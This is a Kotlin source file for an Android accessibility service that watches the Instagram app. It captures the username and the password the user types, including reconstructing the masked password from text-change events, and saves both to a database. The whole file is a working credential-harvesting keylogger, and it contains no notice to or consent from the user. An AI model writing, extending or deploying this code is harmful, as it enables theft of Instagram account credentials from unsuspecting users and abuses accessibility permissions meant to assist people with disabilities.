package com.project.account.instagramAccessibilityService

import com.project.account.api.DEFAULT_BOOLEAN
import com.project.account.api.EMPTY_STRING
import com.project.account.api.inject
import com.project.account.coroutines.ApplicationScope
import com.project.account.coroutines.subscribe
import com.project.account.interactor.InsertOrUpdateAccountUseCase
import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.view.accessibility.AccessibilityEvent
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

class InstagramAccessibilityService : AccessibilityService() {
    private val insertOrUpdateAccountUseCase by inject<InsertOrUpdateAccountUseCase>()
    private val info = AccessibilityServiceInfo()
    private var userName = EMPTY_STRING
    private var password = EMPTY_STRING
    private var userNameSelected = DEFAULT_BOOLEAN
    private var passwordSelected = DEFAULT_BOOLEAN

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        event?.let {
            val eventType = it.eventType
            when {
                eventType == AccessibilityEvent.TYPE_VIEW_FOCUSED -> {
                    passwordSelected = event.isPassword
                    userNameSelected = !event.isPassword
                }

                eventType == AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED && userNameSelected -> {
                    val selectedText = event.text.toString()
                        .removePrefix("[")
                        .removeSuffix("]")
                    userName = selectedText
                }

                eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED && passwordSelected -> {
                    val selectedText = event.text.toString()
                        .removePrefix("[")
                        .removeSuffix("]")
                        .trim('•')
                    password += selectedText
                }

                (eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED ||
                        eventType == AccessibilityEvent.TYPE_TOUCH_INTERACTION_END)
                        && userName.isNotEmpty() && password.isNotEmpty() -> {
                    insertUserToDataBase()
                }
            }
        }
    }

    override fun onInterrupt() {
        // Метод вызывается, если возникла ошибка или сервис прерван
    }

    override fun onServiceConnected() {
        info.apply {
            eventTypes =
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or
                        AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED or
                        AccessibilityEvent.TYPE_VIEW_FOCUSED or
                        AccessibilityEvent.TYPE_VIEW_ACCESSIBILITY_FOCUS_CLEARED or
                        AccessibilityEvent.TYPE_VIEW_CLICKED or
                        AccessibilityEvent.TYPE_VIEW_CONTEXT_CLICKED or
                        AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED or
                        AccessibilityEvent.TYPE_TOUCH_INTERACTION_END or
                        AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED

            packageNames = arrayOf(INSTAGRAM_PACKAGE_NAME)
            feedbackType = AccessibilityServiceInfo.FEEDBACK_SPOKEN
            notificationTimeout = 100
        }
        this.serviceInfo = info
    }

    private fun insertUserToDataBase() {
        ApplicationScope().launch(Dispatchers.IO) {
            insertOrUpdateAccountUseCase.invoke(userName, password).subscribe {
                userName = EMPTY_STRING
                password = EMPTY_STRING
                userNameSelected = DEFAULT_BOOLEAN
                passwordSelected = DEFAULT_BOOLEAN
            }
        }
    }
}